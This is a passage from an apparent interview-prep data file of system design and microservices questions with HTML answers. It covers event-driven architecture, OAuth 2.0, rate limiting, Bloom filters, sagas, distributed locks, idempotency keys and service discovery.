
Event-Driven (asynchronous):
  Order Service → publishes "OrderCreated" event
    → Payment Service listens and processes payment
    → Inventory Service listens and reserves stock
    → Notification Service listens and sends email
  (loosely coupled, each service works independently)</pre>
<p><strong>Key concepts:</strong></p>
<ul>
<li><strong>Event</strong>: "Something happened" (OrderCreated, PaymentCompleted)</li>
<li><strong>Producer</strong>: Service that emits the event</li>
<li><strong>Consumer</strong>: Service that reacts to the event</li>
<li><strong>Event Bus/Broker</strong>: Kafka, RabbitMQ, AWS SNS/SQS</li>
</ul>
<p><strong>Example:</strong> When you place an Uber ride:</p>
<ol>
<li>"RideRequested" event is published</li>
<li>Driver Matching Service finds a driver</li>
<li>Pricing Service calculates fare</li>
<li>Notification Service alerts the driver</li>
</ol>
<div class="key-point">EDA gives you <strong>loose coupling</strong>, <strong>scalability</strong>, and <strong>resilience</strong>. But debugging is harder because there's no linear flow to follow. Use distributed tracing (Jaeger, Zipkin).</div>`,
      },
      {
        q: 'What is the difference between Authentication and Authorization?',
        difficulty: 'easy',
        a: `<p><strong>Authentication (AuthN)</strong> = "Who are you?" → Verifying identity (login).</p>
<p><strong>Authorization (AuthZ)</strong> = "What can you do?" → Verifying permissions.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>Authentication</strong>: Showing your ID card at the airport (proving who you are).</li>
<li><strong>Authorization</strong>: Your boarding pass says you can enter Gate 5 but not the VIP lounge (what you're allowed to do).</li>
</ul>
<pre>Flow:
  1. User sends username + password → Server verifies → Authentication ✅
  2. User tries to access /admin → Server checks role → Authorization ✅ or ❌

Common implementations:
  Authentication: JWT tokens, OAuth 2.0, session cookies
  Authorization: RBAC (Role-Based), ABAC (Attribute-Based), ACL</pre>
<p><strong>Example:</strong></p>
<pre>// JWT token after login:
{
  "user_id": 123,
  "role": "editor",         // used for Authorization
  "exp": 1699999999         // token expiry
}

// Authorization check:
if (user.role === "admin") → allow DELETE /posts
if (user.role === "editor") → allow PUT /posts
if (user.role === "viewer") → allow GET /posts only</pre>
<div class="key-point">Authentication always comes first. You must know WHO the user is before checking WHAT they can do.</div>`,
      },
      {
        q: 'What is OAuth 2.0 and how does it work?',
        difficulty: 'hard',
        a: `<p><strong>OAuth 2.0</strong> is an authorization framework that lets a third-party app access your data without giving it your password.</p>
<p><strong>Analogy:</strong> You want a house cleaner (App) to enter your house (Google account). Instead of giving them your house key (password), you give them a temporary access card (token) that only opens the front door (limited access) and expires after 2 hours.</p>
<pre>OAuth 2.0 Flow (Authorization Code):

1. User clicks "Login with Google" on YourApp
2. YourApp redirects to Google: "This app wants access to your email"
3. User approves on Google's page
4. Google redirects back to YourApp with an authorization code
5. YourApp exchanges code for an access token (server-to-server)
6. YourApp uses the token to call Google APIs

  [User] → [YourApp] → [Google Auth Server]
                              ↓ (auth code)
           [YourApp] → exchanges code → [Access Token]
           [YourApp] → uses token → [Google API: get user email]</pre>
<p><strong>Key terms:</strong></p>
<ul>
<li><strong>Resource Owner</strong>: The user (you)</li>
<li><strong>Client</strong>: The third-party app</li>
<li><strong>Authorization Server</strong>: Google/Facebook login server</li>
<li><strong>Resource Server</strong>: Google API that has your data</li>
<li><strong>Access Token</strong>: Short-lived key to access resources</li>
<li><strong>Refresh Token</strong>: Long-lived key to get new access tokens</li>
</ul>
<div class="key-point">OAuth 2.0 is for <strong>authorization</strong> (granting access), not authentication. <strong>OpenID Connect (OIDC)</strong> is built on top of OAuth 2.0 and adds authentication (proving identity).</div>`,
      },
      {
        q: 'How would you design a Notification System?',
        difficulty: 'hard',
        a: `<p>A notification system sends messages to users through multiple channels: push notifications, SMS, email, and in-app.</p>
<pre>Architecture:
  [Any Service] → "SendNotification" event → [Notification Service]
                                                    ↓
                                          [Priority Queue]
                                         /     |      \\
                                    [Push]  [Email]  [SMS]
                                   Worker   Worker   Worker
                                      ↓        ↓       ↓
                                   [FCM/   [SendGrid] [Twilio]
                                    APNs]</pre>
<p><strong>Step-by-step design:</strong></p>
<p><strong>1. User preferences:</strong></p>
<pre>Table: notification_preferences
| user_id | channel  | enabled | quiet_hours    |
| 123     | push     | true    | 22:00-07:00    |
| 123     | email    | true    | null           |
| 123     | sms      | false   | null           |</pre>
<p><strong>2. Template system:</strong></p>
<pre>"Your order {order_id} has been shipped!"
→ Rendered per channel (HTML for email, plain text for SMS)</pre>
<p><strong>3. Rate limiting &amp; deduplication:</strong></p>
<ul>
<li>Don't spam users: max 3 push notifications per hour</li>
<li>Deduplicate: same notification shouldn't be sent twice</li>
</ul>
<p><strong>4. Retry with exponential backoff:</strong></p>
<pre>If SMS fails: retry after 1s → 2s → 4s → 8s → give up</pre>
<p><strong>Example:</strong> When your Amazon package ships, the notification system sends a push notification, an email, and an in-app message — all through different workers but triggered by one event.</p>
<div class="key-point">Use a <strong>message queue</strong> (Kafka/SQS) to decouple notification sending. This ensures notifications are delivered even if a worker crashes — the message stays in the queue.</div>`,
      },
      {
        q: 'What is the Single Point of Failure (SPOF) and how do you eliminate it?',
        difficulty: 'easy',
        a: `<p>A <strong>Single Point of Failure (SPOF)</strong> is any component whose failure would bring down the entire system.</p>
<p><strong>Analogy:</strong> A chain is only as strong as its weakest link. If your system has one database server and it crashes, everything goes down — that's a SPOF.</p>
<pre>SPOF Examples:
  ❌ One database server → crashes → entire app is down
  ❌ One load balancer → crashes → no traffic gets through
  ❌ One data center → power outage → everything goes dark

Eliminating SPOFs:
  ✅ Database: Master + Replica (auto-failover)
  ✅ Load Balancer: Active-Passive pair
  ✅ Data Center: Multi-region deployment
  ✅ DNS: Multiple DNS providers</pre>
<p><strong>Strategies:</strong></p>
<ul>
<li><strong>Redundancy</strong>: Duplicate every critical component</li>
<li><strong>Failover</strong>: Automatic switch to backup when primary fails</li>
<li><strong>Multi-region</strong>: Deploy in multiple geographic regions</li>
<li><strong>Health checks</strong>: Continuously monitor and auto-replace unhealthy nodes</li>
</ul>
<p><strong>Example:</strong> Netflix runs in multiple AWS regions. If the entire US-East region goes down, traffic automatically routes to US-West. Users don't even notice.</p>
<div class="key-point">Walk through your architecture diagram and ask: "What happens if THIS component dies?" If the answer is "everything breaks", that's a SPOF you need to address.</div>`,
      },
      {
        q: 'How would you design a Rate Limiter service?',
        difficulty: 'hard',
        a: `<p>A rate limiter service controls request traffic to protect backend services from overload and abuse.</p>
<p><strong>Design requirements:</strong></p>
<ul>
<li>Low latency (must not slow down requests)</li>
<li>Distributed (works across multiple servers)</li>
<li>Configurable rules (different limits per API, user, IP)</li>
</ul>
<pre>Architecture:
  [Client] → [API Gateway] → [Rate Limiter] → [Backend Service]
                                    ↓
                              [Redis Cluster]
                           (stores counters)</pre>
<p><strong>Token Bucket implementation with Redis:</strong></p>
<pre>// For each user/API key, store in Redis:
Key: "rate:user123:/api/orders"
Value: { tokens: 8, last_refill: 1699000000 }

On each request:
1. Calculate tokens to add since last_refill
2. If tokens > 0: decrement and ALLOW
3. If tokens == 0: REJECT with 429

// Redis Lua script (atomic operation):
local tokens = redis.call('GET', key)
if tonumber(tokens) > 0 then
  redis.call('DECR', key)
  return 1  -- allowed
else
  return 0  -- rejected
end</pre>
<p><strong>Rules configuration:</strong></p>
<pre>rules:
  - api: /api/login
    limit: 5 requests/minute/IP     # prevent brute force
  - api: /api/orders
    limit: 100 requests/minute/user  # normal usage
  - api: /api/search
    limit: 30 requests/minute/user   # expensive query</pre>
<p><strong>Response headers:</strong></p>
<pre>X-RateLimit-Limit: 100
X-RateLimit-Remaining: 42
X-RateLimit-Reset: 1699001000
HTTP 429 Too Many Requests (when limit exceeded)</pre>
<div class="key-point">Use <strong>Redis</strong> for distributed rate limiting (fast, atomic). Run the rate limiter in the <strong>API Gateway</strong> so it protects all services uniformly.</div>`,
      },
      {
        q: 'What is a Bloom Filter and when would you use it?',
        difficulty: 'hard',
        a: `<p>A <strong>Bloom Filter</strong> is a space-efficient data structure that tells you:</p>
<ul>
<li>"Definitely NOT in the set" → <strong>100% certain</strong></li>
<li>"Probably in the set" → <strong>might be wrong</strong> (false positive)</li>
</ul>
<p><strong>Analogy:</strong> A bouncer at a club with a guest list. The bouncer can quickly say "you're definitely NOT on the list" (accurate). But sometimes they say "you might be on the list, go check inside" (might be wrong).</p>
<pre>How it works:
1. A bit array of size m (all zeros initially)
2. k hash functions

Adding "apple":
  hash1("apple") = 3  → set bit 3
  hash2("apple") = 7  → set bit 7
  hash3("apple") = 11 → set bit 11

  Bit array: [0,0,0,1,0,0,0,1,0,0,0,1,0,0,0]

Checking "banana":
  hash1("banana") = 3  → bit 3 is 1 ✅
  hash2("banana") = 5  → bit 5 is 0 ❌ → DEFINITELY NOT in set

Checking "grape":
  All bits are 1 → PROBABLY in set (could be false positive)</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li><strong>Chrome Safe Browsing</strong>: Check if a URL is malicious (filter 99% of URLs instantly)</li>
<li><strong>Database queries</strong>: Check if a key exists before hitting disk (Cassandra, HBase)</li>
<li><strong>Email spam</strong>: Quick check if an email was already seen</li>
<li><strong>Username availability</strong>: Fast "this username is taken" check</li>
</ul>
<div class="key-point">Bloom filters use <strong>very little memory</strong> compared to storing actual items. 1 billion items can be checked with ~1GB of memory and &lt;1% false positive rate.</div>`,
      },
      {
        q: 'How do you handle distributed transactions across microservices?',
        difficulty: 'hard',
        a: `<p>In microservices, a single business operation may span multiple services/databases. You can't use a simple database transaction because each service has its own database.</p>
<p><strong>Problem example:</strong></p>
<pre>Place Order:
  1. Order Service: Create order ✅
  2. Payment Service: Charge credit card ✅
  3. Inventory Service: Deduct stock ❌ (out of stock!)
  → Need to undo steps 1 and 2!</pre>
<p><strong>Solution 1: Saga Pattern</strong> (most popular)</p>
<pre>Choreography Saga (event-driven):
  Order Created → Payment Service listens → Payment Charged
  → Inventory Service listens → Stock Deducted → Done!
  
  If Inventory fails → publishes "StockFailed" event
  → Payment Service listens → Refund issued
  → Order Service listens → Order cancelled

Orchestration Saga (central coordinator):
  [Saga Orchestrator]
    → Step 1: Call Order Service
    → Step 2: Call Payment Service  
    → Step 3: Call Inventory Service (fails!)
    → Compensate Step 2: Refund payment
    → Compensate Step 1: Cancel order</pre>
<p><strong>Solution 2: Two-Phase Commit (2PC)</strong></p>
<pre>Phase 1 (Prepare): Coordinator asks all services "Can you commit?"
  All say YES → Phase 2: "Commit!"
  Any says NO → Phase 2: "Rollback!"

(Rarely used in microservices — too slow and blocking)</pre>
<div class="key-point">Use the <strong>Saga pattern</strong> in microservices. Choreography for simple flows, Orchestration for complex flows. Always define <strong>compensating actions</strong> (undo) for each step.</div>`,
      },
      {
        q: 'What is the CQRS pattern (Command Query Responsibility Segregation)?',
        difficulty: 'hard',
        a: `<p><strong>CQRS</strong> = use different models for reading and writing data.</p>
<p><strong>Analogy:</strong> A restaurant has two windows:</p>
<ul>
<li><strong>Order window</strong> (Command/Write): Place orders, send to kitchen</li>
<li><strong>Pickup window</strong> (Query/Read): Pick up your food, optimized for fast delivery</li>
</ul>
<pre>Traditional (same model for read & write):
  [Client] → [API] → [Single Database] → reads & writes

CQRS (separate models):
  [Client] → Write API → [Command Model] → [Write DB]
                                    ↓ (events/sync)
  [Client] → Read API → [Query Model] → [Read DB]</pre>
<p><strong>Why separate them?</strong></p>
<ul>
<li>Reads and writes have different needs</li>
<li><strong>Writes</strong>: Need validation, business rules, normalized data</li>
<li><strong>Reads</strong>: Need speed, denormalized data, different views</li>
</ul>
<p><strong>Example:</strong> E-commerce product page:</p>
<pre>Write model (normalized):
  products table + categories table + reviews table (3 JOINs to read)

Read model (denormalized, optimized for display):
  product_view: { name, category_name, avg_rating, review_count }
  → Single fast read, no JOINs needed</pre>
<p>The write DB stays normalized (correct). The read DB is a denormalized projection (fast).</p>
<div class="key-point">CQRS works great with <strong>Event Sourcing</strong>. Often paired with Kafka: writes go to the write DB, events trigger updates to the read DB. Adds complexity — only use when read/write patterns are very different.</div>`,
      },
      {
        q: 'How would you design a file storage system like Google Drive/Dropbox?',
        difficulty: 'hard',
        a: `<p>A cloud file storage system needs to handle file upload/download, syncing across devices, sharing, and versioning.</p>
<p><strong>Key components:</strong></p>
<pre>Architecture:
  [Client Apps] → [API Gateway] → [Metadata Service] → [Metadata DB]
       ↕                               ↓
  [Block Server] → [Object Storage (S3)]
       ↓
  [Sync Service] → [Notification Service] → [Other Clients]</pre>
<p><strong>1. File chunking (key insight!):</strong></p>
<pre>Instead of uploading a 1GB file as one piece:
  Split into 4MB chunks → upload each chunk separately

Benefits:
  - Resume interrupted uploads (only re-upload failed chunks)
  - Deduplication: if two users upload the same file, store chunks once
  - Delta sync: if 1 byte changes, only re-upload the affected chunk</pre>
<p><strong>2. Metadata:</strong></p>
<pre>Table: files
| file_id | user_id | name      | path    | size  | version |

Table: chunks
| chunk_id | file_id | chunk_order | hash    | storage_url |</pre>
<p><strong>3. Sync across devices:</strong></p>
<ul>
<li>Client keeps a local snapshot of file metadata</li>
<li>Periodically (or via WebSocket push) compare local vs server state</li>
<li>Download only changed chunks</li>
</ul>
<p><strong>4. Storage:</strong> Use object storage (AWS S3, GCS) — virtually unlimited, cheap, durable (99.999999999% durability).</p>
<p><strong>Example:</strong> Dropbox splits files into 4MB blocks, hashes each block, and only uploads blocks that changed. If you edit one paragraph in a 100MB document, only a 4MB chunk is synced.</p>
<div class="key-point">The magic is in <strong>chunking + deduplication + delta sync</strong>. This is what makes Dropbox fast even on slow connections.</div>`,
      },
      {
        q: 'What is a cache stampede (thundering herd) and how do you prevent it?',
        difficulty: 'tricky',
        a: `<p>A <strong>cache stampede</strong>: a popular cache key expires, and thousands of concurrent requests all miss at once and hit the database together — often taking it down. The nastiest version is self-inflicted: the DB slows, requests pile up, and the retry wave makes it worse.</p>
<pre>The scenario:
  key "home_feed" (10,000 req/s) expires at 12:00:00
  → 10,000 requests miss simultaneously
  → 10,000 identical queries slam the DB
  → DB melts, latency spikes, retries amplify the load</pre>
<p><strong>Defenses (combine several):</strong></p>
<ul>
<li><strong>Request coalescing / single-flight</strong>: only ONE request per key recomputes; the rest wait for its result (Go <code>singleflight</code>, a per-key mutex in Redis: <code>SET lock:key NX PX 3000</code>).</li>
<li><strong>Stale-while-revalidate</strong>: serve the expired value immediately, refresh in the background. Users see slightly stale data instead of an outage.</li>
<li><strong>Jittered TTL</strong>: <code>ttl = base + random(0, 10%)</code> so keys written together don't expire together.</li>
<li><strong>Early probabilistic refresh</strong>: each hit refreshes with a probability that grows as expiry approaches (XFetch algorithm) — the key never actually expires under load.</li>
<li><strong>Negative caching</strong>: cache "not found" results briefly so missing keys can't be used to bypass the cache.</li>
</ul>
<p><strong>Related: the hot key / celebrity problem</strong> — one key too popular for a single cache node (Bieber posts a photo):</p>
<pre>Fixes: local in-process cache (even 1s TTL absorbs most reads),
       replicate the key: feed:123#1..N on different nodes, pick randomly</pre>
<div class="key-point">Interviewers push on this after any "add a cache" answer. The senior move is naming the failure mode unprompted: "I'd add jittered TTLs and single-flight so we don't stampede the DB on expiry."</div>`,
      },
      {
        q: 'How do you generate unique IDs in a distributed system?',
        difficulty: 'hard',
        a: `<p>Auto-increment doesn't work across many nodes. Classic trade-off question: uniqueness vs sortability vs coordination.</p>
<table><tr><th>Approach</th><th>Pros</th><th>Cons</th></tr>
<tr><td>UUID v4</td><td>No coordination, trivial</td><td>128-bit, random → terrible as B-tree PK (random inserts fragment the index), not time-sortable</td></tr>
<tr><td>DB auto-increment</td><td>Simple, sortable</td><td>SPOF, doesn't scale writes; multi-master offset trick (1,3,5.. / 2,4,6..) is brittle</td></tr>
<tr><td>Ticket server (Flickr)</td><td>Central control</td><td>Extra hop, needs HA pair</td></tr>
<tr><td>Snowflake</td><td>64-bit, time-sortable, no coordination per ID</td><td>Needs unique worker IDs, sensitive to clock skew</td></tr>
<tr><td>UUID v7 / ULID / KSUID</td><td>Time-ordered + random, index-friendly</td><td>128-bit (bigger than Snowflake)</td></tr>
</table>
<pre>Twitter Snowflake — 64 bits:
| 1 bit | 41 bits timestamp (ms) | 10 bits machine ID | 12 bits sequence |
  sign    ~69 years of ms         1024 workers          4096 IDs/ms/worker

= 4M+ IDs per second per worker, roughly time-sorted, fits in a BIGINT</pre>
<p><strong>The tricky follow-up — clock skew:</strong> what if the machine clock moves backward (NTP correction)? Snowflake generators must refuse to issue IDs (wait or error) until the clock catches up, otherwise duplicates. This is the detail interviewers fish for.</p>
<div class="key-point">Good default today: <strong>UUID v7</strong> (time-ordered, standardized, no infrastructure) or <strong>Snowflake</strong> when you need compact 64-bit sortable IDs. Mention why random UUIDv4 hurts clustered-index insert performance — that's the senior signal.</div>`,
      },
      {
        q: 'Is exactly-once delivery possible in distributed systems?',
        difficulty: 'tricky',
        a: `<p>The trick question: <strong>exactly-once <em>delivery</em> is impossible</strong> over an unreliable network — but <strong>exactly-once <em>processing</em> (effectively-once)</strong> is achievable.</p>
<pre>Why delivery can't be exactly-once:
  Producer sends message → network timeout → was it received?
  - Don't retry → maybe ZERO deliveries (message lost)
  - Retry       → maybe TWO deliveries (it had arrived)
  You cannot distinguish "lost" from "slow ack". (Two Generals problem)</pre>
<p><strong>So real systems pick at-least-once + deduplication:</strong></p>
<pre>1. Producer: retry until acknowledged (at-least-once)
   + attach a stable message ID / idempotency key

2. Consumer: make processing IDEMPOTENT
   INSERT INTO processed_messages(message_id) VALUES (?)  -- unique constraint
   → duplicate arrives → constraint violation → skip, ack, move on

3. Or make the operation naturally idempotent:
   SET balance = 100        (idempotent — safe to repeat)
   vs balance = balance + 10 (NOT idempotent — must dedupe)</pre>
<p><strong>What about "Kafka exactly-once semantics (EOS)"?</strong> It's transactional: for Kafka→Kafka pipelines, consuming offsets and producing results commit <em>atomically</em>, so reprocessing isn't visible downstream. The moment you touch an external system (DB, email, payment API), you're back to needing idempotency on that system.</p>
<div class="key-point">Interview-ready answer: "Exactly-once delivery is impossible; we get effectively-once by combining at-least-once delivery with idempotent consumers — dedup table keyed by message ID, updated in the same transaction as the business change."</div>`,
      },
      {
        q: 'How do you implement a distributed lock? What can go wrong?',
        difficulty: 'tricky',
        a: `<p>Naive Redis lock, and the interview is about its failure modes:</p>
<pre>SET lock:order:42 &lt;token&gt; NX PX 30000   -- acquire: only if not exists, 30s TTL
-- release: must be atomic check-and-delete (Lua), only if WE still own it:
if redis.call("GET", key) == token then redis.call("DEL", key) end</pre>
<p><strong>The famous failure (Kleppmann's GC-pause scenario):</strong></p>
<pre>1. Client A acquires lock (TTL 30s)
2. A hits a 40s stop-the-world GC pause / network blip
3. Lock EXPIRES; client B acquires it and starts writing
4. A wakes up, still believes it holds the lock → writes too
→ TWO writers. The lock did not protect anything.</pre>
<p><strong>Fix: fencing tokens</strong> — the lock service hands out a monotonically increasing number; the protected resource rejects stale tokens:</p>
<pre>A gets lock with token 33 → pauses
B gets lock with token 34 → writes (storage records 34)
A wakes, writes with token 33 → storage: 33 &lt; 34 → REJECTED ✅</pre>
<ul>
<li><strong>Redis Redlock</strong> (quorum over N independent Redis nodes): controversial — Kleppmann showed it's unsafe under clock jumps/pauses without fencing. Fine for efficiency locks, not correctness locks.</li>
<li><strong>ZooKeeper / etcd</strong>: consensus-backed, ephemeral nodes + monotonic versions (natural fencing tokens) — the right tool when correctness matters.</li>
</ul>
<div class="key-point">Senior distinction: is the lock for <strong>efficiency</strong> (avoid duplicate work — a flaky lock is fine) or <strong>correctness</strong> (prevent data corruption — needs consensus + fencing)? Often the best answer is no lock at all: a unique constraint, conditional update (<code>WHERE version = ?</code>), or idempotency achieves the same goal without the distributed-lock minefield.</div>`,
      },
      {
        q: 'How do you do back-of-envelope capacity estimation in a system design interview?',
        difficulty: 'medium',
        a: `<p>Interviewers want the <em>method</em>, not precision. Round aggressively to powers of 10.</p>
<pre>Numbers to memorize:
  1 day ≈ 86,400 s ≈ 10^5 s
  1M requests/day ≈ 12 req/s   (÷ 10^5)
  peak traffic ≈ 2–5× average
  char = 1 B, int/long = 4–8 B, UUID = 16 B, 1M × 1KB = 1 GB

Worked example — Twitter-like service:
  100M DAU, each writes 2 tweets, reads 100 tweets/day

  Write QPS : 100M × 2 / 10^5  = 2,000 /s   (peak ~5,000)
  Read QPS  : 100M × 100 / 10^5 = 100,000 /s (peak ~250,000)
  → read:write = 50:1 → design is READ-heavy → cache + fan-out strategy

  Storage: tweet ≈ 300 B metadata+text
  200M tweets/day × 300 B ≈ 60 GB/day ≈ 22 TB/year (×3 replication = 66 TB)
  10% have media (1 MB avg) → 20 TB/day of blobs → object storage + CDN

  Bandwidth: reads 100k/s × 300 B ≈ 30 MB/s API (media via CDN, not our servers)

  Cache (80/20 rule): 20% of daily reads hot
  10^10 reads × 20% × 300 B ≈ 600 GB → a handful of Redis nodes</pre>
<div class="key-point">The conclusions are the point, not the numbers: "read-heavy → cache aggressively", "media dominates storage → S3+CDN", "5k writes/s → a single well-tuned DB can't take 250k reads/s → replicas + cache". State assumptions out loud and sanity-check orders of magnitude.</div>`,
      },
      {
        q: 'What are quorum reads and writes (N, R, W)?',
        difficulty: 'hard',
        a: `<p>In leaderless replication (Dynamo, Cassandra), each value lives on <strong>N</strong> replicas. A write must be confirmed by <strong>W</strong> nodes, a read queries <strong>R</strong> nodes.</p>
<pre>The quorum condition:   R + W &gt; N
→ read set and write set MUST overlap
→ at least one node in every read has the latest write

N=3, W=2, R=2  (typical):  2+2 &gt; 3 ✅
  Write: send to 3 replicas, ack to client after 2 confirm
  Read : ask 3 (or 2) replicas, take the value with newest version

Tuning:
  W=1, R=3 → fast writes, expensive reads
  W=3, R=1 → slow writes, fast reads, write availability suffers
  W=1, R=1 → fast everything, R+W ≤ N → stale reads possible</pre>
<p><strong>Why quorums still aren't perfect (senior follow-ups):</strong></p>
<ul>
<li>Concurrent writes to different nodes → conflicts; need versioning (vector clocks) or last-write-wins (loses data on clock skew).</li>
<li><strong>Sloppy quorum + hinted handoff</strong>: during a partition, writes land on stand-in nodes and are handed back later — availability up, overlap guarantee temporarily broken.</li>
<li><strong>Read repair / anti-entropy</strong>: when a read sees divergent replicas, it writes the newest value back to stale ones.</li>
</ul>
<div class="key-point">Quorum ≠ strong consistency — it's tunable consistency. Cassandra exposes this per query: <code>QUORUM</code>, <code>ONE</code>, <code>LOCAL_QUORUM</code>, <code>ALL</code>. Knowing that R+W&gt;N gives overlap (not linearizability) is the distinction that separates senior answers.</div>`,
      },
      {
        q: 'How do you prevent double payment / double charging? (idempotency in practice)',
        difficulty: 'tricky',
        a: `<p>The scenario every payment interviewer asks: user clicks Pay, request times out, client (or user) retries. Was the first request processed? You must make the retry <strong>safe</strong>.</p>
<pre>1. Client generates an idempotency key ONCE per logical action
   (UUID created when the Pay button is rendered — NOT per HTTP attempt)

   POST /payments
   Idempotency-Key: 3f2a-...-9c1b
   { "orderId": 42, "amount": 99.00 }

2. Server — atomically claim the key BEFORE doing the work:
   INSERT INTO idempotency_keys (key, status, response)
   VALUES ('3f2a...', 'IN_PROGRESS', NULL);   -- UNIQUE constraint on key

   - insert OK        → first attempt → charge the card
                        → UPDATE ... SET status='DONE', response={...}
   - duplicate key    → status DONE        → return the SAVED response (no re-charge)
                      → status IN_PROGRESS → 409/retry-later (first attempt still running)

3. Downstream: pass the same key to the payment provider
   (Stripe/PayPal support Idempotency-Key natively → dedupe on their side too)</pre>
<p><strong>Details that mark a senior answer:</strong></p>
<ul>
<li>The dedupe check and the business write must be in the <strong>same DB transaction</strong> — check-then-act across two systems reintroduces the race.</li>
<li>Key includes/binds the request payload hash — same key with different amount is an error, not a replay.</li>
<li>Keys expire (e.g. 24h) so storage doesn't grow forever.</li>
<li>Timeout ambiguity: on timeout the client must retry with the <strong>same key</strong> — retrying with a fresh key is exactly how double charges happen.</li>
</ul>
<div class="key-point">Pattern generalizes to any non-idempotent POST: unique constraint claims the operation, the stored response makes replays return identical results. "The database's unique constraint is doing the distributed coordination" is the key insight.</div>`,
      },
    ],
  },

  // ───────────────────────── ALGORITHMS & DATA STRUCTURES ─────────────────────────
  // ========================= MICROSERVICES =========================,
  {
    id: 'microservices',
    name: 'Microservices',
    icon: '🧩',
    questions: [
      {
        q: 'What is microservice architecture and when should you choose it?',
        difficulty: 'medium',
        a: `<p><strong>Microservice architecture</strong> breaks a system into small services, each owning one business capability and deployed independently.</p>
<pre>Monolith:
  [One Big App: Users + Orders + Payments + Notifications]

Microservices:
  [User Service] ←REST/gRPC→ [Order Service] ←events→ [Payment Service]
       ↓                           ↓                        ↓
  [User DB]                   [Order DB]               [Payment DB]</pre>
<p><strong>When to choose microservices:</strong></p>
<ul>
<li>Large system with multiple autonomous teams</li>
<li>Different parts need different scaling (e.g., search vs checkout)</li>
<li>Independent release cycles are critical</li>
<li>Different tech stacks needed per service</li>
</ul>
<p><strong>When NOT to choose:</strong></p>
<ul>
<li>Small team (&lt;10 developers)</li>
<li>Early-stage product where requirements change fast</li>
<li>Simple CRUD applications</li>
</ul>
<div class="key-point">Start with a well-structured monolith. Extract microservices only when the organizational or scaling pressure is real. Premature microservices is a common and expensive mistake.</div>`,
      },
      {
        q: 'What is service discovery in microservices?',
        difficulty: 'medium',
        a: `<p><strong>Service discovery</strong> lets services find healthy instances of each other dynamically instead of hard-coding IP addresses.</p>
<pre>Without service discovery:
  Order Service → http://10.0.1.5:8080/payments  (hardcoded, breaks on scale)

With service discovery:
  Order Service → "payment-service" → Registry resolves → http://10.0.1.5:8080
                                                         or http://10.0.1.6:8080</pre>
<p><strong>Two patterns:</strong></p>
<ul>
<li><strong>Client-side discovery</strong>: Client queries a registry (Eureka, Consul) and picks an instance itself. More control, more complex client.</li>
<li><strong>Server-side discovery</strong>: Client talks to a load balancer/DNS that resolves the target. Simpler client.</li>
</ul>
<pre>// Spring Cloud example (client-side with Eureka):
@FeignClient(name = "payment-service")
public interface PaymentClient {
    @PostMapping("/charge")
    PaymentResult charge(@RequestBody PaymentRequest req);
}
// Eureka resolves "payment-service" to an available instance</pre>
<div class="key-point">In Kubernetes, service discovery is built-in via DNS. <code>payment-service.default.svc.cluster.local</code> resolves automatically. No need for a separate registry.</div>`,
      },
      {
        q: 'What is the difference between synchronous and asynchronous communication between services?',
        difficulty: 'medium',
        a: `<ul>
<li><strong>Synchronous</strong>: Caller sends request and <strong>waits</strong> for response. REST, gRPC.</li>
<li><strong>Asynchronous</strong>: Caller sends message and <strong>continues</strong> without waiting. Kafka, RabbitMQ, SQS.</li>
</ul>
<pre>// Synchronous: Order → waits → Payment response
POST /api/payments  → { status: "charged" }  // blocks until response

// Asynchronous: Order → publishes event → continues
publish("order.created", { orderId: 123 })
// Payment service consumes event independently
// Order service gets result later via another event</pre>
<table><tr><th>Aspect</th><th>Synchronous</th><th>Asynchronous</th></tr>
<tr><td>Latency</td><td>Caller blocked</td><td>Caller free</td></tr>
<tr><td>Coupling</td><td>Tight (both must be up)</td><td>Loose (queue buffers)</td></tr>
<tr><td>Debugging</td><td>Easier (request-response)</td><td>Harder (event chains)</td></tr>
<tr><td>Use case</td><td>Need immediate answer</td><td>Background processing</td></tr></table>
<div class="key-point">Use synchronous for user-facing operations that need immediate results. Use asynchronous for background workflows, notifications, and inter-service decoupling.</div>`,
      },
      {
        q: 'Why is database-per-service important in microservices?',
        difficulty: 'hard',
        a: `<p>Each service should own its own database so schema changes and deployments stay independent.</p>
<pre>❌ Shared database (distributed monolith):
  Order Service ──→ [Shared DB] ←── Payment Service
  (Schema change in orders table can break payment service!)

✅ Database per service:
  Order Service → [Order DB]
  Payment Service → [Payment DB]
  (Each team controls their own schema)</pre>
<ul>
<li><strong>Benefits</strong>: Independent deployments, technology freedom (SQL for orders, NoSQL for catalog), clear ownership.</li>
<li><strong>Challenges</strong>: Cross-service queries become harder (no JOINs), data consistency requires patterns (Saga, Event Sourcing).</li>
</ul>
<p><strong>How to query across services:</strong></p>
<ul>
<li>API composition: aggregate data from multiple service APIs</li>
<li>CQRS: maintain read-optimized views materialized from events</li>
<li>Data replication: each service caches what it needs from others</li>
</ul>
<div class="key-point">If multiple services directly write the same tables, you usually have a distributed monolith — all the complexity of microservices with none of the benefits.</div>`,
      },
      {
        q: 'What is the BFF pattern in microservices?',
        difficulty: 'medium',
        a: `<p><strong>Backend for Frontend (BFF)</strong> creates a dedicated backend API layer per client type (web, mobile, IoT).</p>
<pre>Without BFF:
  Mobile App ──→ [Generic API] ←── Web App
  (Mobile gets too much data, web gets too little)

With BFF:
  Mobile App → [Mobile BFF] → services (optimized payloads, fewer calls)
  Web App → [Web BFF] → services (richer data, parallel fetching)
  Admin → [Admin BFF] → services (bulk operations, different auth)</pre>
<p><strong>Benefits:</strong></p>
<ul>
<li>Each client gets exactly the data shape it needs</li>
<li>Reduces over-fetching and under-fetching</li>
<li>Client-specific logic stays out of core services</li>
<li>Each frontend team owns their BFF</li>
</ul>
<pre>// Mobile BFF: lightweight response
GET /mobile/product/123
→ { name, price, thumbnailUrl }

// Web BFF: rich response
GET /web/product/123
→ { name, price, images[], reviews[], relatedProducts[], specs }</pre>
<div class="key-point">BFF is especially useful when web and mobile need very different payload shapes. Consider GraphQL as an alternative that can serve multiple clients from one endpoint.</div>`,
      },
      {
        q: 'What is idempotency and why is it important in distributed systems?',
        difficulty: 'hard',
        a: `<p>An operation is <strong>idempotent</strong> if performing it multiple times has the same effect as performing it once.</p>
<pre>// Idempotent: safe to retry
PUT /users/123 { name: "John" }  → Always sets name to "John"
DELETE /orders/456               → First call deletes, retries return 404

// NOT idempotent: dangerous to retry
POST /payments { amount: 100 }   → Each call creates a NEW payment!
POST /orders                     → Each call creates a NEW order!</pre>
<p><strong>How to make non-idempotent operations safe:</strong></p>
<pre>// Idempotency key pattern:
POST /payments
Headers: Idempotency-Key: "abc-123-unique"
Body: { amount: 100 }

// Server: check if "abc-123-unique" was already processed
if (exists(idempotencyKey)) {
